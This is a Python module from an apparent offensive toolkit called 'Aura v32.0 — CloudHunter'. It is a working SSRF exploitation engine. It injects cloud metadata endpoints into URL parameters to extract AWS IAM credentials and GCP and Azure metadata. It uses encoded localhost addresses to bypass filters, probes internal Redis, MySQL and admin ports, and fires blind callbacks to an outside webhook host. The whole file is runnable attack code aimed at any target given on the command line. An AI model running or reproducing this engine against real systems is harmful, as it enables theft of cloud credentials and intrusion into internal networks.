# -*- coding: utf-8 -*-
"""
Aura v32.0 — CloudHunter (SSRF & Metadata Exploitation) ☁️
==========================================================
Advanced engine to detect and exploit Server-Side Request Forgery, specifically
targeting Cloud Infrastructure (AWS, GCP, Azure, DigitalOcean) and internal networks.

Attacks Implemented:
  1. Cloud Metadata Exploitation (AWS IAM extraction, GCP Service Accounts).
  2. Localhost Bypasses (IPv6, Decimal IPs, DNS Rebinding).
  3. Internal Port Scanning (Redis, Elasticsearch, MongoDB mapping).
  4. Blind OOB SSRF via Webhooks.
"""

import asyncio
import json
import os
import random
import re
import string
import time
import urllib.parse
import httpx
from datetime import datetime
from pathlib import Path
from typing import Optional

import urllib3
# disable annoying warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
try:
    from curl_cffi import requests as curlr
except ImportError:
    pass

from rich.console import Console

console = Console()

# ─── Configuration & Payloads ────────────────────────────────────────────────

SSRF_PARAMS = {
    "url", "src", "href", "link", "path", "resource", "redirect",
    "proxy", "fetch", "load", "target", "uri", "endpoint", "image",
    "webhook", "callback", "return_url", "redirect_url", "redirect_uri",
    "out", "host", "domain", "api", "file", "document", "folder"
}

CLOUD_METADATA_PAYLOADS = {
    "AWS_IAM": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS_USER_DATA": "http://169.254.169.254/latest/user-data",
    "GCP_METADATA": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "AZURE_METADATA": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "ALIBABA": "http://100.100.100.200/latest/meta-data/",
    "DIGITAL_OCEAN": "http://169.254.169.254/metadata/v1.json",
}

LOCALHOST_BYPASS_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",            # IPv6
    "http://0x7f000001/",       # Hex encoded
    "http://2130706433/",       # Decimal encoded
    "http://127.0.0.1.nip.io/", # Magic DNS Rebinding
    "http://127.1/",            # Dropped octets
    "http://0.0.0.0/",
    "http://localhost:22",
    "http://127.0.0.1:6379",    # Redis
    "http://127.0.0.1:3306",    # MySQL
    "http://127.0.0.1:8080",    # Admin
]

INTERNAL_PORTS = {
    "6379": "Redis Server",
    "9200": "Elasticsearch",
    "27017": "MongoDB",
    "8080": "Internal Admin Panel",
    "3000": "Internal App"
}

# Signatures to confirm success
SSRF_SIGNATURES = {
    "AWS": [r"ami-id", r"instance-action", r"instance-id", r"security-credentials"],
    "GCP": [r"computeMetadata", r"google.internal"],
    "Azure": [r"azEnvironment", r"osProfile"],
    "Redis": [r"redis_version", r"os:Linux"],
    "Elasticsearch": [r"cluster_name", r"lucene_version"],
    "GenericLocal": [r"ubuntu", r"debian", r"apache", r"nginx", r"welcome to nginx"],
}

class OOBClient:
    """Out-Of-Band Client for Blind SSRF Detection"""
    def __init__(self):
        self.correlation_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        
        # Pull Webhook URL from .env, fallback to Webhook.site demo
        self.webhook_url = os.getenv("AURA_WEBHOOK_URL")
        self.webhook_domain = ""
        
        if self.webhook_url:
            if not self.webhook_url.startswith("http"):
                self.webhook_url = "https://" + self.webhook_url
            self.webhook_domain = urllib.parse.urlparse(self.webhook_url).netloc
            console.print(f"  [cyan]🔗 CloudHunter loaded custom OOB webhook: {self.webhook_domain}[/cyan]")
        else:
            self.webhook_url = "https://webhook.site/YOUR-UUID-HERE/" + self.correlation_id
            self.webhook_domain = "webhook.site"
            console.print(f"  [dim yellow]⚠️ No AURA_WEBHOOK_URL set. Blind SSRF will point to: {self.webhook_url}[/dim yellow]")

    def get_payload(self, param: str) -> str:
        """Generates a tracking URL for a specific parameter injection."""
        base = self.webhook_url.rstrip("/")
        if "?" in base:
            return f"{base}&ssrf={param}&id={self.correlation_id}"
        return f"{base}?ssrf={param}&id={self.correlation_id}"


class CloudHunter:
    """v32.0: Cloud Metadata & SSRF Exploitation Engine."""

    def __init__(self, target: str, cookies_str: str = "", output_dir: str = "./reports", timeout: int = 15):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.cookies = self._parse_cookies(cookies_str)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.findings: list[dict] = []
        self.tested: set[str] = set()
        self.oob = OOBClient()

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in (cookie_str or "").split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    async def _async_request(self, method: str, url: str, headers: dict = None) -> httpx.Response | None:
        """Sends an async request using httpx for speed."""
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=self.timeout, cookies=self.cookies) as client:
                req_headers = {"User-Agent": "Aura/32.0 (CloudHunter SSRF Engine)"}
                if headers:
                    req_headers.update(headers)
                return await client.request(method, url, headers=req_headers)
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Safely mutates a URL query parameter."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _extract_injectable_targets(self, discovery_map: dict) -> list[dict]:
        """Extracts parameters likely vulnerable to SSRF from the discovery map."""
        all_calls = (
            discovery_map.get("all_api_calls", []) +
            discovery_map.get("idor_candidates", []) +
            discovery_map.get("mutating_endpoints", [])
        )
        
        injectable = []
        seen = set()

        for call in all_calls:
            url = call.get("url", "")
            if not url: continue

            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

            for param_name, values in params.items():
                if param_name.lower() in SSRF_PARAMS:
                    key = (parsed.path, param_name)
                    if key not in seen:
                        seen.add(key)
                        injectable.append({
                            "url": url,
                            "method": call.get("method", "GET"),
                            "param": param_name,
                            "original_value": values[0] if values else "",
                        })
        return injectable

    async def _test_cloud_metadata(self, target_info: dict) -> dict | None:
        """Injects payloads targeting AWS/GCP/Azure Metadata APIs."""
        url = target_info["url"]
        param = target_info["param"]
        
        for name, payload in CLOUD_METADATA_PAYLOADS.items():
            injected_url = self._inject_param(url, param, payload)
            
            # GCP requires an extra header, AWS IMDSv2 requires token (we test IMDSv1 primarily)
            headers = {}
            if name == "GCP_METADATA":
                headers["Metadata-Flavor"] = "Google"

            resp = await self._async_request("GET", injected_url, headers)
            
            if resp and resp.status_code == 200:
                text = resp.text.lower()
                
                # Verify signatures
                is_vuln = False
                for sig in SSRF_SIGNATURES["AWS"] + SSRF_SIGNATURES["GCP"] + SSRF_SIGNATURES["Azure"]:
                    if re.search(sig, text, re.IGNORECASE):
                        is_vuln = True
                        break
                        
                if is_vuln or "accesskeyid" in text or "privatekey" in text:
                    return {
                        "type": f"Cloud Metadata SSRF ({name})",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "severity": "CRITICAL",
                        "impact": "Account Takeover of Cloud Infrastructure. Exposure of IAM Role Credentials limits/keys.",
                        "snippet": resp.text[:300].strip(),
                        "confirmed": True
                    }
        return None

    async def _test_localhost_bypass(self, target_info: dict) -> dict | None:
        """Injects tricky localhost representations to bypass WAFs and internal checks."""
        url = target_info["url"]
        param = target_info["param"]
        
        for payload in LOCALHOST_BYPASS_PAYLOADS:
            injected_url = self._inject_param(url, param, payload)
            resp = await self._async_request("GET", injected_url)
            
            if resp and resp.status_code in [200, 401, 403]:
                text = resp.text.lower()
                is_vuln = False
                for sig in SSRF_SIGNATURES["GenericLocal"]:
                    if re.search(sig, text, re.IGNORECASE):
                        is_vuln = True
                        break
                        
                if is_vuln:
                    return {
                        "type": "Localhost SSRF (WAF Bypass)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "severity": "HIGH",
                        "impact": "Bypasses external firewalls. Allows accessing internal admin panels on 127.0.0.1.",
                        "snippet": resp.text[:200].strip(),
                        "confirmed": True
                    }
        return None

    async def _test_blind_oob(self, target_info: dict) -> dict | None:
        """Injects OOB URL for Blind SSRF."""
        url = target_info["url"]
        param = target_info["param"]
        
        # Fire and forget
        payload = self.oob.get_payload(param)
        injected_url = self._inject_param(url, param, payload)
        
        # We don't await the response body, just trigger it
        asyncio.create_task(self._async_request("GET", injected_url))
        
        if self.oob.webhook_url != "https://webhook.site/YOUR-UUID-HERE/" + self.oob.correlation_id:
            return {
                "type": "Blind OOB SSRF Triggered",
                "url": url,
                "param": param,
                "payload": payload,
                "severity": "MEDIUM",
                "impact": "Potential Blind SSRF. An out-of-band request was armed.",
                "snippet": f"Monitor your webhook: {self.oob.webhook_domain}",
                "confirmed": False
            }
        return None

    # ── Main Scanner Logic ──────────────────────────────────────────────
    async def run(self, discovery_map: dict) -> list[dict]:
        console.print(f"\n[bold magenta]☁️ AURA v32.0 — CloudHunter (SSRF Engine)[/bold magenta]")
        console.print(f"🎯 Target: {self.target}")

        targets = self._extract_injectable_targets(discovery_map)
        
        if not targets:
            # Fallback blind tests if map gives nothing
            common_paths = ["/api/proxy", "/fetch", "/api/fetch", "/webhook"]
            for p in common_paths:
                targets.append({
                    "url": f"{self.target}{p}?url=http://example.com",
                    "method": "GET",
                    "param": "url",
                    "original_value": "http://example.com"
                })

        console.print(f"  [cyan]Analyzing {len(targets)} parameters for SSRF Vulnerabilities...[/cyan]")

        tasks = []
        for target_info in targets:
            # Multi-layer testing
            tasks.append(self._test_cloud_metadata(target_info))
            tasks.append(self._test_localhost_bypass(target_info))
            tasks.append(self._test_blind_oob(target_info))

        try:
            results = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=120)
        except asyncio.TimeoutError:
            console.print("[yellow]⚠️  SSRF scan timed out (120s limit reached). Processing partial results...[/yellow]")
            results = []
        
        for result in results:
            if result and not isinstance(result, Exception):
                sev = result.get("severity", "HIGH")
                color = "red" if sev == "CRITICAL" else "orange1" if sev == "HIGH" else "yellow"
                
                # Group deduplication
                key = f"{result['type']}_{result['url']}_{result['param']}"
                if key not in self.tested:
                    self.tested.add(key)
                    if result.get("confirmed", False):
                        console.print(f"     🚨 [{color}]{result['type']}[/{color}] Confirmed on param: '{result['param']}'")
                    else:
                        console.print(f"     📡 [{color}]{result['type']}[/{color}] Armed on param: '{result['param']}'")
                    
                    self.findings.append(result)

        self._finalize_report()
        return self.findings

    def _finalize_report(self):
        if self.findings:
            target_slug = urllib.parse.urlparse(self.target).netloc.replace(".", "_")
            out_path = self.output_dir / f"clouhunter_ssrf_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.target,
                    "scan_time": datetime.utcnow().isoformat(),
                    "findings": self.findings
                }, f, indent=2)
            console.print(f"\n  💾 SSRF Findings saved: {out_path}")
        else:
            console.print(f"\n  ✅ No direct Cloud SSRF discovered.")


def run_ssrf_scan(target: str, discovery_map_path: str = None):
    """CLI runner for direct execution."""
    import httpx
    engine = CloudHunter(target=target)
    
    discovery_map = {}
    if discovery_map_path and os.path.exists(discovery_map_path):
        try:
            with open(discovery_map_path, "r", encoding="utf-8") as f:
                discovery_map = json.load(f)
        except Exception as e:
            console.print(f"[dim red]Error loading discovery map: {e}[/dim red]")

    if not discovery_map:
        # Give it a dummy map for standalone testing
        discovery_map = {
             "all_api_calls": [{"url": target + "/proxy?url=test", "method": "GET"}]
        }
    return asyncio.run(engine.run(discovery_map))

if __name__ == "__main__":
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    run_ssrf_scan(url)
